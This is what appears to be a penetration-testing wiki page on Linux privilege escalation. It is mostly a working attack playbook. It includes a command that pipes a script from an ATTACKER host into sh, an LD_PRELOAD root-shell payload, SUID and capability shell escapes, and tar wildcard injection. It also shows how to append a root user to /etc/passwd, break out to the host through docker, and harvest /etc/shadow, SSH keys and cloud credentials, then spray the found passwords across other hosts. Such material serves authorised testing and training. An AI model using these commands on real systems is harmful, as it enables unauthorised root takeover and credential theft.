---
tags:
  - Privesc
  - Linux
---

# :material-linux: Linux Privilege Escalation

<span class="pill pill-medium">post-ex</span> <span class="pill pill-info">linux</span>

You have a low-privilege shell. The goal is `root`. Almost every path is a **misconfiguration** you can find by enumerating carefully.

!!! abstract "TL;DR"
    Run `linpeas`, then work the high-probability vectors: `sudo -l`, SUID binaries, writable cron/services, capabilities, and credentials lying in files. Cross-reference every interesting binary against [GTFOBins](https://gtfobins.github.io/).

## :material-clipboard-list: Enumerate first

```bash
# Fast context
id; sudo -l; uname -a; cat /etc/os-release
# The workhorse
curl -L http://ATTACKER/linpeas.sh | sh | tee linpeas.txt
# Or upload and run
./linpeas.sh -a 2>&1 | tee linpeas.txt
```

Also run manually:

```bash
sudo -l                                   # what can I run as root?
find / -perm -4000 -type f 2>/dev/null    # SUID binaries
getcap -r / 2>/dev/null                   # capabilities
cat /etc/crontab; ls -la /etc/cron.*      # scheduled jobs
ps aux --forest                           # running processes / services
```

## :material-account-tie: sudo abuse

<span class="pill pill-easy">check this first</span>

```bash
sudo -l
```

- `(ALL) NOPASSWD: /usr/bin/vim` → GTFOBins: `sudo vim -c ':!/bin/sh'`.
- `(ALL) ALL` → `sudo su`.
- **LD_PRELOAD / env_keep** set → build a malicious shared object:
  ```bash
  echo 'void _init(){setuid(0);system("/bin/sh");}' > x.c
  gcc -shared -fPIC -nostartfiles -o /tmp/x.so x.c
  sudo LD_PRELOAD=/tmp/x.so <allowed-binary>
  ```
- Old sudo: **CVE-2021-3156 (Baron Samedit)** heap overflow, **CVE-2019-14287** (`sudo -u#-1`).

!!! tip "GTFOBins is the answer key"
    For *any* binary you can run via sudo/SUID, search [GTFOBins](https://gtfobins.github.io/). It gives the exact escape (`sudo`, `SUID`, `capabilities`, `file read/write` sections).

## :material-key-chain: SUID / SGID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

- Standard risky ones: `find`, `nmap` (old), `vim`, `nano`, `cp`, `bash`, `env`, `python`.
  ```bash
  find . -exec /bin/sh -p \; -quit          # SUID find -> root shell
  install -m =xs /bin/sh /tmp/rootbash; /tmp/rootbash -p
  ```
- **Custom SUID binaries** — reverse them; look for `system()` calls with relative paths (PATH hijack) or command injection.

## :material-shield-star: Linux capabilities

```bash
getcap -r / 2>/dev/null
```

- `cap_setuid+ep` on python/perl → instant root:
  ```bash
  /usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
  ```
- `cap_dac_read_search` → read any file (`/etc/shadow`).

## :material-clock-outline: Cron & timers

```bash
cat /etc/crontab; ls -la /etc/cron.d /etc/cron.hourly
grep -R "" /etc/cron* 2>/dev/null
```

- **Writable script** run by root → drop a reverse shell / add SUID bash.
- **Wildcard injection** (`tar *`, `rsync *`) → GTFOBins wildcard tricks:
  ```bash
  # If a root cron runs: tar czf backup.tgz *
  echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > shell.sh
  touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh shell.sh'
  ```
- **PATH hijack**: cron calls a binary by relative name and you control an earlier PATH dir.

## :material-key-variant: Hunting credentials

!!! loot "Where creds hide on Linux"
    ```bash
    grep -RiE 'password|passwd|secret|api[_-]?key' /var/www /opt /home 2>/dev/null
    cat ~/.bash_history ~/.ssh/id_* /etc/shadow 2>/dev/null
    find / -name '*.env' -o -name 'config.php' -o -name 'wp-config.php' 2>/dev/null
    cat ~/.aws/credentials ~/.config/gcloud/*   # cloud pivot!
    # Databases, .kdbx, .git-credentials, backups
    ```
    Reuse anything you find — spray passwords across users and other hosts.

## :material-server: Services & other vectors

- **Writable `/etc/passwd`** → add a root user:
  ```bash
  openssl passwd -1 -salt x pass          # -> hash
  echo 'r00t:<hash>:0:0::/root:/bin/bash' >> /etc/passwd; su r00t
  ```
- **Docker/LXD group** membership → mount host / spawn privileged container:
  ```bash
  docker run -v /:/mnt -it alpine chroot /mnt sh
  ```
- **NFS `no_root_squash`** → drop a SUID binary from a machine where you're root.
- **Kernel exploits** (last resort — can panic the box): DirtyPipe (CVE-2022-0847), DirtyCOW, PwnKit (`pkexec` CVE-2021-4034).

!!! opsec "Kernel exploits are risky"
    They can crash the target and are noisy. Prefer misconfig-based privesc; keep kernel exploits as a last resort and note the reboot risk in your report.

## :material-link-variant: Related

- Arrived from [File Upload](../web/file-upload.md) / [SQLi](../web/sqli.md) / [Deserialization](../web/deserialization.md).
- Found cloud creds? → [AWS](../cloud/aws.md) / [Azure](../cloud/azure.md) / [GCP](../cloud/gcp.md).
- Keep access → [Persistence](persistence.md); go deeper → [Pivoting](pivoting.md).
- Reference: [GTFOBins](https://gtfobins.github.io/), [HackTricks Linux privesc](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html).
